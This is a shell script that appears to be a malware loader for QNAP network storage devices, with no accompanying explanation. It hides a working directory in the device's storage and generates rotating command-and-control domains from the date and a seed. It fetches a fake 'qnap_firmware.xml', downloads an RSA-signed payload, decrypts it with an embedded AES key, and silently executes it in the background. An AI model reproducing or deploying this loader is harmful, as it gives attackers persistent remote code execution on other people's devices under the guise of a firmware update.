export PATH="${PATH}:/bin:/sbin:/usr/bin:/usr/sbin:/usr/bin/X11:/usr/local/sbin:/usr/local/bin"

command -v getcfg > /dev/null 2>&1 || getcfg () { sed -n 'H;${x;s/\(.*\n\['"${1//\//\\\/}"']\|^\['"${1//\//\\\/}"']\)\n//I;s/\(^\|\n\)\[[^\n]\+\]\n.*//p}' "${4:-${confdir}/uLinux.conf}" | sed -n 's/^'"${2//\//\\\/}"' \?= \?\(.*\)/\1/Ip'; }

test -d /etc/config && confdir=/etc/config || { test -d /mnt/HDA_ROOT/.config && confdir=/mnt/HDA_ROOT/.config; }

bdir=
test -f "${confdir}/smb.conf" && for i in homes Public Download Multimedia Web Recordings; do bdir=`getcfg "$i" path -f "${confdir}/smb.conf"` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && test -d "$bdir" && testwriteable=$(mktemp "${bdir}/.tmp.XXXXXX") && rm "${testwriteable}" && break; bdir=''; done
test -z "${bdir}" || test ! -d "${bdir}" && { command -v readlink >/dev/null 2>&1 || ln -sf /bin/busybox /usr/bin/readlink; for i in Public Download Multimedia Web Recordings homes; do bdir=`readlink "/share/${i}" 2>/dev/null` && test ! -z "$bdir" && bdir=`dirname "$bdir"` && bdir=/share/${bdir##*/} && test -d "$bdir" && break; done;
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`getcfg SHARE_DEF defVolMP -f "${confdir}/def_share.info"`
test -z "${bdir}" || test ! -d "${bdir}"; } && { bdir=`mount | sed -n "s/.*\(\/share\/[^ /]\+\) .*/\1/gp" | head -n 1`
test -z "${bdir}" || test ! -d "${bdir}"; } && { for i in CACHEDEV3_DATA CACHEDEV2_DATA CACHEDEV1_DATA MD0_DATA; do test -d "/share/${i}" && bdir="/share/${i}" && break; done;
test -z "${bdir}" || test ! -d "${bdir}" && bdir=/mnt/HDA_ROOT; }
grep -F '' <<EOF >/dev/null 2>&1 && fgrep="grep -F" || { command -v fgrep >/dev/null 2>&1 && fgrep=fgrep || fgrep=grep; }

EOF
test "$fgrep" || fgrep=grep
test "$RANDOM" || RANDOM=17653
genrstr () 
{ 
    local s=;
    local min=${1:-4};
    local max=${2:-12};
    local kspace="${3:-a-zA-Z}"
    tr -dc "$kspace" < /dev/urandom | { 
        read -rn $(($RANDOM % ( $max - $min + 1 ) + $min )) s;
        echo "$s"
    }
}

verifyfile() {
local file="$1"
local sig="${2:-$file_s}"
local out
test ! -z "$file" && test -s "$file" || return 1
test ! -z "$sig" && test -s "$sig" || return 1
test -f ".rsakey" || echo "$verifykey" > ".rsakey"
out=$(openssl dgst -sha1 -verify ".rsakey" -signature "$sig" "$file") && test "$out" = "Verified OK" && return 0
return 1
}

decryptfile() {
local file="$1"
local ofile="${2:-${file}}"
local key='7C0vK4SzMO15zBxLD7XCi5hbjgP1ZjkJ'
openssl enc -d -aes-256-cbc -k "$key" -md sha1 -salt < "$file" > "${file}_d" || return $?
test -f "$ofile" && rm -f "$ofile"
mv "${file}_d" "$ofile" && return 0
return 1
}

verifykey='-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAt/EDT6SB75atrHW7Cpog
CXqrBM2CVbJo';verifykey="${verifykey}"'g4rwwS''z1Bp1i1'
verifykey="${verifykey}"'B7B9Wd51no32lpRqOM+9GOr2W17xwJ8pqpQotex
RC5qQSiS/7FS48jsPKsJnrUhnsI1fRLM4DqsEF3UOukZuDOYUhlteDuMqqZBz0AC
Q3YnLjraTjchMF0XmaAAcWOkg5MsxAOKTepue4R/tnrPAkAG86nq5LA1+wa7opNV
gQzwDh7YXhBnWz52+ebZ9TeqD31/sb5hoyUKf1Nr5HcKkklObuz1OGQJ//pkCbTC
2EnQw6tCPQhgSIA8wJKkaxW0f/UHP+YBmWa4Wn+uPrJJuHSVNEJtAp2wlX3THltz
0IGPQEuzoafOAl3EFjas3HcTX2HlEfnvAtRL2iLxJeba1nZ+U3geZOuxL1NhWhNh
pjaLcKwhkRck7Y5hr1Pz8pLDnXsx5w0QUz6XS8HVf/KHnNXHufFEn01y9YoPuau1
DNnpDGbq632Bs8ESd3ueHk9OY/UZxWeN3UdbseFxK35XAgMBAAE=
-----END PUBLIC KEY-----'

DOMAIN_EXT_A='cf tk ml ga gq'
DOMAIN_EXT_B='com biz org de rocks mx cn top nl men ws se info xyz net today ru fi name to in com.ua vg vn cd'

test -d "${bdir}/.qpkg" || mkdir "${bdir}/.qpkg"
test -d "${bdir}/.qpkg/.liveupdate" || mkdir "${bdir}/.qpkg/.liveupdate"
cd "${bdir}/.qpkg/.liveupdate" && rm -f .tmp.*

echo "$verifykey" > ".rsakey"
i=0 n=0 c=0 errorcount=0
outfile=$(mktemp "./.tmp.XXXXXX") || outfile=$(mktemp "${bdir}/.tmp.XXXXXX") || outfile=$(mktemp "/.tmp.XXXXXX") || outfile='./.tmp.out'

for domainexts in "$DOMAIN_EXT_A" "$DOMAIN_EXT_B"; do
        for ext in $domainexts; do
                hostname=$(echo "$(( $(date +%s) / 1296000 ))IbjGOEgnuD${ext}" | openssl dgst -sha1 -binary | openssl base64 | sed 'y/ABCDEFGHIJKLMNOPQRSTUVWXYZ-+\//abcdefghijklmnopqrstuvwxyzabc/;s/=//g')
                hostname=${hostname%[a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9][a-z0-9]}
                hostnames="${hostname%[a-z0-9][a-z0-9][a-z0-9][a-z0-9]} ${hostname%[a-z0-9][a-z0-9][a-z0-9]}"
                hostnames="$hostnames ${hostname%[a-z0-9][a-z0-9]} ${hostname%[a-z0-9]} $hostname"
                for host in $hostnames; do
                        test -f "$outfile" && rm -f "$outfile"
                        recentupdate=''
                        curl --connect-timeout 12 -m 30 -k -o "$outfile" "https://${host}.${ext}/qnap_firmware.xml?t=$(date +%s)"
                        test -s "$outfile" || continue
                        fsize=$(( $(wc -c < "$outfile") ))
                        test "$fsize" -gt 4096 && rm -f "$outfile" && continue
                        rsamsg=$(openssl base64 -in "$outfile" -d | openssl rsautl -pubin -inkey ".rsakey" -verify) || continue
                        test "$rsamsg" || continue
                        path="${rsamsg%|*}"; rsadomain="${path%|*}"; path="${path#*|}"
                        hash="${rsamsg##*|}"; ts="${hash#*_}"; hash="${hash%_*}"
                        test "$rsadomain" = "${host}.${ext}" || continue
                        timenow=$(date +%s)
                        test "$ts" -gt 0 && { test "$ts" -gt "$timenow" || test $(( $timenow - $ts )) -lt 172800; } && recentupdate=1
                        curl --connect-timeout 12 -m 300 -k -o "$outfile" "https://${host}.${ext}/${path}"
                        filehash=$(openssl dgst -sha1 -binary "$outfile" | openssl base64) || continue
                        test "$filehash" = "$hash" || continue
                        curl --connect-timeout 12 -m 30 -k -o "${outfile}_s" "https://${host}.${ext}/s/${path}"
                        verifyfile "$outfile" "${outfile}_s" && decryptfile "$outfile" || continue
                        mv "${outfile}_s" "${ts}_v"
                        chmod 755 "$outfile" || continue
                        ( ( exec >/dev/null 2>/dev/null </dev/null; "$outfile" ) & )
                        test "$recentupdate" -eq 1 && exit 0
                done
        done
done